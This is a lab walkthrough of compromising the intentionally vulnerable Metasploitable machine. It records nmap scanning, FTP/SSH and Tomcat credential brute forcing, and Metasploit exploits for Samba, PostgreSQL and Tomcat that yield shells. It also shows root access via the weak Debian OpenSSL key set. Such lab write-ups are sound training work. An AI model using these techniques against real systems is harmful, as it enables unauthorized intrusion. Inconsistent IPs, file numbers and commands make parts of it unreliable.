### download the machine from https://www.vulnhub.com/entry/metasploitable-1,28/  
then launch using VMware credentials are msfadmin:msfadmin
ip a to get machine 

Notes :
----

make sure your system is upgraded           
sudo apt update && sudo apt upgrade                 
sudo apt install exploitdb 


scan the target using nmap 
--
Nmap -sV -Sc 192.168.1.9

get 12 open ports (21 -22-23-25-53-80-139-445-3306-5430-8009)
 
  
now lets walkthrough each port and see what we can do (separately and combined):
----

PORT  ::  STATE  ::  SERVICE ::  VERSIO
  
21/tcp :: open :: ftp ::   ProFTPD 1.3.1  
  ----

perform the command "searchsploit ProFTPD 1.3.1 " to check if the service is vulnerable
  
Exploits: No Results

try "searchsploit ProFTPD 1.3. " 
  
found some interesting result like " ProFTPd IAC 1.3.x - Remote Command Execution | linux/remote/15449.pl"
  
run the command " searchsploit -m linux/remote/15449.pl "   to mirror the exploit which is  source code written in Perl 
  
nano 15449.pl
  
taking some time try to understand the code and verify that's not malicious
  ----
using the interpreter python to verfiy ech hexa variable 
  
i DECIDED TO Import this source code to Metasploit As module if you don't know how 
watch this video for it >> https://www.youtube.com/watch?v=l7mwIvT5YNo

the result wasn't pleasant :::Metasploit is not detecting the script  
  --
  
searching for the issu found that this exploit does not written as Metasploit module so 
  
msf would have no idea what to do with it
  
you can see this article  https://github.com/rapid7/metasploit-framework/issues/12825

so i decided to run the exploit as it is using perl interpreter 
  --
typing Perl 15549.pl <ip target> <my ip> target type by

it appeared that this script does not have vuln for the exact ProFTPD 1.3.1  So it fails to exploit the service 

so I've moved to another approach " brute forcing the service for weak credentials " 
  --
using Nmap Engine 
nmap <tagetip> 21 --script =ftp-brute.nse

took 600s to find valid credential of user:user 

checking to see if this ftp supports executing command through " SITE EXEC command" 
it seems like it does not support that 

so far we got valid credentials for ftp with no ability to execute commands or existence of sensitive files
 perform another intensive scan for the ftp , found potential vuln
 
 CVE-2011-4130 CVSS 9.0
 ---
 
allows remote authenticated users to execute arbitrary code , let's give it a shot 
 
 unfortunately there are no proof of concept or working exploit available online also there is no Metasploit module for it
 
 so let's move on
 
 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
----
trying the same credentials of fttp for ssh it works :D 

  now we can execute files on the machine  
 
 get step back and use nmap script engine for intensive scanning for port22
 
 nmap -sV -sC 192.168.1.3 -p 22 --script vuln get some result 
 
 CVE-2011-1013 CVSS 7.2
---
 allows local users to cause a denial of service (system crash)

 CVE-2010-4478 CVSS 7.5
---
 which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate
 
  unfortunately there are no proof of concept or working exploit available online also there are no Metasploit module for them
 
 so I've moved to another approached " brute forcing the service for root credentials " using metaspolit
 ---
 msf > use auxiliary/scanner/ssh/ssh_login
 
msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
 
RHOSTS => 192.168.1.3
 
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 

 msf auxiliary(ssh_login) > run
 
 no promising results , so lets move forward 
 
23/tcp   open  telnet      Linux telnetd
---
 nmap

  nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 search sploits for telnet Linux 
 couldn't verify that the service is vulnerable 

 25/tcp   open  smtp        Postfix smtpd
 -----
 
 nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 the service is vulnerable to two mitm attacks (which i skipped) 
 enumerating the user using smpt-user-enum tool getting me this result 
 --
 
 192.168.1.3:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data

brute forcing the password using hydra but authentication not enabled on the server 
 
 53/tcp   open  domain      ISC BIND 9.4.2
----
 using nmap engine found CVE-2008-0122 CSSV 10.0 vulneraries that causes Denial Of Service Execute Code Memory corruption

 
 There are not any Metasploit modules related to this CVE or any working online exploit
 
 
 
 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
---
 running nmap , searching edb and mfs couldn't verify vulnerability for the exact version of the service
 
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
      445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
----
 saerching exploit database for Samba getting me MSF module that returns a root shell 
 > use exploit/multi/samba/usermap_script
> set RHOST 192.168.1.3
> exploit 

 $whoami 

 root 
 sudo/etc/shadow :D 
 
 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 ---
 Could not find any vulnerabilities matching this version
 
 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
---
 
searching the MSF i found a module for remote shell 
 
 msf >> use exploit/linux/postgres/postgres_payload
 
 set RHOST 192.168.1.9
 
 run 
 
 whoami >> postgres
 
 now attend previllige esclation
 
 cat /root/.ssh/authorized_keys
 
 copy the rsa key
 
 search exploit database for openssl 
 
 download  the exploit 5622.tar.bz2

https://www.exploit-db.com/exploits/5720
  
 tar -jxvf 5622.tar.bz2
 
 grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
 
 now we got our key 57c3115d77c56390332dc5c49978627a-5429.pub

 attempt to connect as a root
 
 ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.1.9 
 
 whoami >> root
 
 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
-----
 It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat
 
 seems not to be vulnerable 
 
 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
---
 search msf for vulnerability , found RCE that need to be authenticated so we will attempt a brute force searching for weak credentials
 
 use auxiliary/scanner/http/tomcat_enum
 
 set Rhost 192.168.1.9
 
 set targeturi /maanger
 
 set rport 8180
 
 run 
 
 [+] http://192.168.1.9:8180/manager - Users found: admin, both, manager, role1, root, tomcat
 

use auxiliary/scanner/http/tomcat_mgr_login 

 set username tomcat
 
 run 
 
 [+] 192.168.1.19:8180 - Login Successful: tomcat:tomcat

 use exploit/multi/http/tomcat_mgr_deploy
 
set Rhost 192.168.1.9
 
 set targeturi /manager
 
 run 
 
 now we've got our credential lets move for the shell
 
 use exploit/multi/http/tomcat_mgr_deploy
 
 set RHost 192.168.1.9

 set RPORT 8180 

 set httpusername tomcat

 set httppasword tomcat

 run 
 
 now we have our shell and can attend a prev escalation as the way we did with postgress above
 
 
Thanks for taking some time reading this i hope it was useful please don't hesitate correcting me any mistake for giving me advise
